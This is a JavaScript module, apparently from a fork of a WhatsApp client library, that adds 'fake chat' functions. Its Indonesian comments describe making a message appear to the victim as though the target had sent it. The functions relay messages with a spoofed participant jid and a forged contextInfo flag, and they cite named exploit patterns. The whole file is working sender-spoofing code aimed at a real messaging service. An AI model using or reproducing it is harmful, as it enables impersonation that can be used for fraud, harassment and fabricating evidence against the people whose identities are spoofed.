'use strict';

Object.defineProperty(exports, '__esModule', { value: true });
exports.makeFakeChatSocket = void 0;

var _fakeChatUtils = require('../Utils/fake-chat-utils.js');
var _messages = require('../Utils/messages.js');

/**
 * Fake chat / WA Arab — kirim teks dari kita, tampil di korban seolah target yang kirim.
 *
 * Core trick (sudah ada di bails messages-send participant:true):
 *   relayMessage(jid, payload, { participant: { jid } })
 *   → skip patch sender + encrypt sebagai incoming di beberapa client
 *
 * Plus contextInfo.fromMe:false di protobuf untuk UI spoof.
 *
 * @param {import('./business').BusinessSocket} sock
 */
const makeFakeChatSocket = sock => {
  const { relayMessage, logger } = sock;

  /**
   * Fake chat via relay + contextInfo spoof (VampKilliOS / MANTA otaxkiw pattern).
   *
   * @param {string} jid - target
   * @param {string} text - teks yang kamu ketik
   * @param {Object} [options]
   * @param {'extended'|'conversation'} [options.format='extended']
   * @param {boolean} [options.participant=true] - wajib true untuk fakechat
   * @param {string|null} [options.messageId=null]
   * @param {import('../Types').proto.IMessage} [options.quotedMessage]
   * @returns {Promise<import('../Types').WAMessage|void>}
   */
  const sendFakeChat = async (jid, text, options = {}) => {
    const content = options.format === 'conversation'
      ? _fakeChatUtils.buildFakeChatConversation(text, jid, options)
      : _fakeChatUtils.buildFakeChatExtendedText(text, jid, options);

    logger?.debug?.({ jid, format: options.format ?? 'extended' }, 'sendFakeChat');
    return sendFakeChatContent(jid, content, options);
  };

  /**
   * Fake chat via generateWAMessageFromContent + userJid:target (MANTA protongkol8 / otaxkiw).
   * Berguna untuk tipe pesan kompleks (album, interactive, dll).
   *
   * @param {string} jid
   * @param {import('../Types').proto.IMessage} content
   * @param {Object} [options]
   */
  const sendFakeChatContent = async (jid, content, options = {}) => {
    const msg = _messages.generateWAMessageFromContent(jid, content, {
      userJid: jid,
      upload: sock.waUploadToServer,
      ...options.generateOptions
    });

    const relayOpts = {
      messageId: options.messageId ?? msg.key.id,
      ...(options.participant !== false ? { participant: { jid } } : {}),
      ...(options.additionalNodes ? { additionalNodes: options.additionalNodes } : {}),
      ...(options.statusJidList ? { statusJidList: options.statusJidList } : {})
    };

    logger?.debug?.({ jid, msgId: msg.key.id }, 'sendFakeChatContent');
    const stanzaId = await relayMessage(jid, msg.message, relayOpts);
    const messageId = stanzaId || msg.key.id;
    return {
      ...msg,
      key: {
        ...msg.key,
        id: messageId,
        remoteJid: jid,
        participant: jid
      },
      stanzaId: messageId
    };
  };

  // alias komunitas
  const sendArabFakeChat = sendFakeChat;
  const sendWaArab = sendFakeChat;

  return {
    ...sock,
    sendFakeChat,
    sendFakeChatContent,
    sendArabFakeChat,
    sendWaArab,
    buildFakeChatPayload: _fakeChatUtils.buildFakeChatExtendedText,
    buildFakeChatContextInfo: _fakeChatUtils.buildFakeChatContextInfo
  };
};

exports.makeFakeChatSocket = makeFakeChatSocket;